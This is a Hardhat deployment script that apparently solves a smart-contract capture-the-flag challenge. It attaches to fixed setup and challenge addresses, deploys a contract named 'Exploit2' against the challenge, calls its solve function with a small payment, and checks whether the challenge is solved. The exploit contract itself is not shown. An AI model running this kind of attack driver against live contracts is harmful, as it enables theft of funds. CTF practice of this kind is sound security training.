// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  const [accounts] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);

  
  //set addresses for current challenge
  const setupAddress = "0x427255B0e21A7f0D809c7cE854569A10df44378d";
  const challengeAddress = "0x2Dec5971b627485A50af67a921C6ADB6CC3ffCe4";
  const challengeName = "Challenge";
  const setupName = "SetupBackup";

   
  //attach setup
  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);

  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //exploit logic
  //deploy an exploit that will interact with the challenge
  const Exploit = await hre.ethers.getContractFactory("Exploit2");
  const exploit = await Exploit.deploy(challengeAddress);
  await exploit.deployed();
  console.log("Exploit deployed to:", await exploit.address);
  console.log("Contract balance:", await ethers.provider.getBalance(challengeAddress));
  
   
  await exploit.solve({ value: parseEther("0.0000000000000001") });
  
  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
